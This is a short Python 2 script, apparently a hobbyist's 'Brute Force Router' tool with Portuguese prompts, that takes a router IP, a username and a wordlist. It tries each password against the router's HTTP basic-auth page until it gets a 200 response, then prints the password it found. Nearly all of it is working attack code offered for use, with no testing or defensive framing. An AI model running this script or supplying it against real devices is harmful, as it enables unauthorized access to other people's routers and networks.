# -*- coding: utf-8 -*-

import sys
import os
import argparse
try:
	import requests
except:
	install = raw_input('Opss, parece que você não tem o módulo (requests)\n deseja instalar (y/n)? ')
	if(install == 'y'):
		os.system('pip install requests')
	else:
		print '\nBye'
		sys.exit()

parser = argparse.ArgumentParser(description='Coded by: RNX')
parser.add_argument('--target', '-t', help='Ip do roteador', action='store')
parser.add_argument('--login', '-l', help='Login do roteador', action='store')
parser.add_argument('--passfile', '-p', help='Sua wordlist', action='store')
argumentos = parser.parse_args()

wordlist = argumentos.passfile
url = 'http://' + str(argumentos.target)
login = argumentos.login

def banner():
	logo = '''
	*******************************************
	*    [!] Script Brute Force Router v1.0   *
	*******************************************
	              Coded by: RNX
	'''
	print logo

def help():
	ajuda = '''
	Use: python brute_r0ut3r.py --target <ip> --login <login> --passfile <wordlist>
	'''
	print ajuda

def main():
	global wordlist
	global url
	global login

	passlist = []
	os.system('cls' if(os.name == 'nt') else 'reset')
	banner()
	
	if(len(sys.argv) < 3):
		help()
		sys.exit()

	try:
		with open(wordlist, 'r') as password:
			password1 = password.readlines()

			for password_1 in password1:
				passlist.append(password_1.rstrip())

	except IOError:
		print '[-] Wordlist not found!'
		sys.exit()

	for password in passlist:
		envia_request = requests.get(url, auth=(login, password))
		code = envia_request.status_code

		if(code == 200):
			print '[+] Password found => ' + str(password)
			break
		else:
			print '[-] Password incorrect => ' + str(password)
		
if(__name__ == '__main__'):
	main()
	